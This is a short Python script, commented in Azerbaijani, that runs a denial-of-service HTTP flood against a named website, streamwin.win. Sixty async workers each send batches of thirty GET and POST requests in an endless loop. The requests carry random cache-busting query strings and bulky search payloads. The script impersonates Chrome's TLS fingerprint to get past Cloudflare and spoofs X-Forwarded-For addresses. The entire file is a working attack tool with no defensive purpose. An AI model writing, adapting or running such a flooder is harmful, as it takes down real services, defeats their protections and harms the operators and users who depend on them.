import asyncio
from curl_cffi.requests import AsyncSession
import random
import string
import time

TARGET_URL = "https://streamwin.win"
WORKERS = 60 # curl_cffi daha ağırdır, 60 worker kifayət edir
BATCH = 30   # Hər worker eyni anda 30 sürətli və gizli stream açır

def r_str(n):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

async def terminator_strike(worker_id):
    # curl_cffi brauzeri TLS səviyyəsində təqlid edir (JA3 Bypass)
    async with AsyncSession(impersonate="chrome124", http2=True, verify=False) as s:
        print(f"💀 TERMINATOR Worker {worker_id} - CLOUDFLARE BYPASSED!")
        
        while True:
            try:
                # Ağır URL-lər (Axtarış bölmələri, API-lər)
                url = f"{TARGET_URL}/?s={r_str(30)}&v={time.time()}&id={random.getrandbits(32)}"
                
                headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Cache-Control": "no-cache",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}",
                    "X-Requested-With": "XMLHttpRequest"
                }

                tasks = []
                for _ in range(BATCH):
                    # Saytın daxili elementlərini hədəf alan POST və GET qarışığı
                    if _ % 3 == 0:
                        tasks.append(s.post(url, headers=headers, json={"search": r_str(500), "filter": "all"}))
                    else:
                        tasks.append(s.get(url, headers=headers))
                
                # Sorğuları paralel olaraq serverə çırpırıq
                await asyncio.gather(*tasks, return_exceptions=True)
                
            except Exception:
                await asyncio.sleep(0.01)

async def main():
    print(f"💀 TERMINATOR MODE ACTIVE: {TARGET_URL}")
    print("[!] Mimicking Chrome 124 TLS Fingerprint...")
    
    workers = [terminator_strike(i) for i in range(WORKERS)]
    await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
